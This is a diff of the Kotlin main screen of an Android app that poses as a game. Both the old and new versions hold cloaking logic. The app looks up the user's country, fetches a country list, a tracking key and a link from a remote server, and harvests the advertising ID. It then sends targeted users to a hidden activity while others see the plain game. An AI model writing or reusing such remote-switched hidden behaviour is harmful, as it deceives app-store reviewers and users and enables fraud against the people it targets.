@@ -1,71 +1,173 @@
 package com.ngelgames.herocant
 
 import android.content.Intent
-import androidx.appcompat.app.AppCompatActivity
+import android.content.res.Resources
 import android.os.Bundle
-import com.ngelgames.herocant.InMainClass.Companion.grhtyhyddd
-import com.ngelgames.herocant.InMainClass.Companion.lkflflflds
-import com.ngelgames.herocant.InMainClass.Companion.lnlnlnlnlnlnln
+import android.util.Log
+import androidx.appcompat.app.AppCompatActivity
+import androidx.core.os.ConfigurationCompat
+import androidx.work.Configuration
+import com.appsflyer.AppsFlyerConversionListener
+import com.appsflyer.AppsFlyerLib
+import com.google.android.gms.ads.identifier.AdvertisingIdClient
+import com.ngelgames.herocant.InMainClass.Companion.C1
+import com.ngelgames.herocant.InMainClass.Companion.MAIN_ID
+import com.ngelgames.herocant.InMainClass.Companion.appsCheck
+import com.ngelgames.herocant.InMainClass.Companion.appsKey
+import com.ngelgames.herocant.InMainClass.Companion.link
 import com.ngelgames.herocant.databinding.ActivityMainBinding
+import com.orhanobut.hawk.Hawk
 import kotlinx.coroutines.*
-import java.net.HttpURLConnection
-import java.net.URL
+import retrofit2.Retrofit
+import retrofit2.converter.gson.GsonConverterFactory
+import java.util.concurrent.Executors
+import java.util.concurrent.TimeUnit
 
 class MainActivity : AppCompatActivity() {
-    lateinit var bibibibibiibi: ActivityMainBinding
-    lateinit var jojojjojojoj: String
+    lateinit var bindMainAct: ActivityMainBinding
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        bibibibibiibi = ActivityMainBinding.inflate(layoutInflater)
-        setContentView(bibibibibiibi.root)
-        jojojjojojoj = ""
-        val job = GlobalScope.launch(Dispatchers.IO) {
-            jojojjojojoj = coTask()
+
+
+        bindMainAct = ActivityMainBinding.inflate(layoutInflater)
+        setContentView(bindMainAct.root)
+        GlobalScope.launch(Dispatchers.IO) {
+            runBlocking {
+                job
+            }
         }
 
-        runBlocking {
-            try {
-                job.join()
+    }
 
-                if (jojojjojojoj == grhtyhyddd) {
-                    Intent(applicationContext, URam::class.java).also { startActivity(it) }
+    private fun getAdId(){
+            val adInfo = AdvertisingIdClient(applicationContext)
+            adInfo.start()
+            val adIdInfo = adInfo.info.id
+            Log.d("getAdvertisingId = ", adIdInfo.toString())
+            Hawk.put(MAIN_ID, adIdInfo)
+    }
+
+    private fun initApps() {
+        AppsFlyerLib.getInstance()
+            .init(Hawk.get(appsKey), conversionDataListener, applicationContext)
+        AppsFlyerLib.getInstance().start(this@MainActivity)
+    }
+
+    //Data API
+    private suspend fun getData(): String? {
+        val retrofitBuilder = Retrofit.Builder()
+            .addConverterFactory(GsonConverterFactory.create())
+            .baseUrl("http://ip-api.com/")
+            .build()
+            .create(ApiInterface::class.java)
+
+
+        val retData = retrofitBuilder.getData().body()?.countryCode
+        Log.d("Data", "countryCode: $retData ")
+        return retData
+
+    }
+
+
+    //Data Hosting
+    private suspend fun getDataDev(): String? {
+        val retroBuildTwo = Retrofit.Builder()
+            .addConverterFactory(GsonConverterFactory.create())
+            .baseUrl("http://powerofshadow.xyz/")
+            .build()
+            .create(ApiInterface::class.java)
+
+        val linkView = retroBuildTwo.getDataDev().body()?.view
+        Log.d("Data", "getDataDev: $linkView")
+        val appsChecker = retroBuildTwo.getDataDev().body()?.appsChecker
+        val appskey = retroBuildTwo.getDataDev().body()?.appskey
+        Hawk.put(appsKey, appskey)
+        Hawk.put(appsCheck, appsChecker)
+        Hawk.put(link, linkView)
+        Log.d("Data in Hawk", "getDataDev: ${Hawk.get(link, "null")}")
+        Log.d("Data in Hawk", "getDataDev: ${Hawk.get(appsCheck, "null")}")
+        Log.d("Data in Hawk", "getDataDev: ${Hawk.get(appsKey, "null")}")
+        val retroData = retroBuildTwo.getDataDev().body()?.geo
+        Log.d("Data", retroData.toString())
+        return retroData
+    }
+
+    //
+    private val job: Job = GlobalScope.launch(Dispatchers.IO) {
+        val countyCode: String = getData().toString()
+        val countriesPool = getDataDev().toString()
+        val appsCh = Hawk.get(appsCheck, "null")
+        val naming = Hawk.get(C1, "null")
+
+        if (appsCh == "1") {
+            getAdId()
+            val set = getSharedPreferences("PREFS_NAME", 0)
+
+            if (set.getBoolean("my_first_time", true)) {
+
+                initApps()
+                val executorService = Executors.newSingleThreadScheduledExecutor()
+                executorService.scheduleAtFixedRate({
+                    if (naming != null) {
+                        Log.d("TestInUIHawk", naming)
+                        Log.d("AppsChecker", "naming: $naming")
+                        if (naming.contains("tdb2") || countriesPool.contains(countyCode)) {
+                            Log.d("Apps Checker", "naming: $naming")
+                            executorService.shutdown()
+                            startActivity(Intent(this@MainActivity, ITIS::class.java))
+                            finish()
+                        } else {
+                            executorService.shutdown()
+                            startActivity(Intent(this@MainActivity, URam::class.java))
+                            finish()
+                        }
+                    } else {
+                        Log.d("TestInUIHawk", "Received null")
+                    }
+                }, 0, 2, TimeUnit.SECONDS)
+                Log.d("FirstInit", naming)
+                set.edit().putBoolean("my_first_time", false).apply()
+            } else {
+                if (naming.contains("tdb2") || countriesPool.contains(countyCode)) {
+                    Log.d("Apps Checker of second open", "naming: $naming")
+                    startActivity(Intent(this@MainActivity, ITIS::class.java))
+                    finish()
                 } else {
-                    Intent(applicationContext, ITIS::class.java).also { startActivity(it) }
+                    startActivity(Intent(this@MainActivity, URam::class.java))
+                    finish()
                 }
-                finish()
-            } catch (e: Exception) {
-
             }
-        }
-
-    }
-
-    private suspend fun coTask(): String {
-
-        val nmnmnmnmnmnmnmnmmnm =
-            "${lkflflflds}${lnlnlnlnlnlnln}"
-
-        withContext(Dispatchers.IO) {
-            codecodecodecode(nmnmnmnmnmnmnmnmmnm)
-//            Log.d("Check1C", nmnmnmnmnmnmnmnmmnm)
-        }
-        return jojojjojojoj
-    }
-
-    private fun codecodecodecode(link: String) {
-        val ruleri = URL(link)
-        val conconconconcon = ruleri.openConnection() as HttpURLConnection
-
-        try {
-            val txtxtxtxttxtxtxtx = conconconconcon.inputStream.bufferedReader().readText()
-            if (txtxtxtxttxtxtxtx.isNotEmpty()) {
-
-                jojojjojojoj = txtxtxtxttxtxtxtx
-            }
-        } catch (ex: Exception) {
-
-        } finally {
-            conconconconcon.disconnect()
+        } else if (countriesPool.contains(countyCode)) {
+            startActivity(Intent(this@MainActivity, ITIS::class.java))
+            finish()
+        } else {
+            startActivity(Intent(this@MainActivity, URam::class.java))
+            finish()
         }
     }
 }
+
+    val conversionDataListener = object : AppsFlyerConversionListener {
+        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
+
+            val dataGotten = data?.get("campaign").toString()
+            Hawk.put(C1, dataGotten)
+        }
+
+        override fun onConversionDataFail(p0: String?) {
+
+        }
+
+        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {
+
+        }
+
+        override fun onAttributionFailure(p0: String?) {
+        }
+    }
+
+
+
+
+
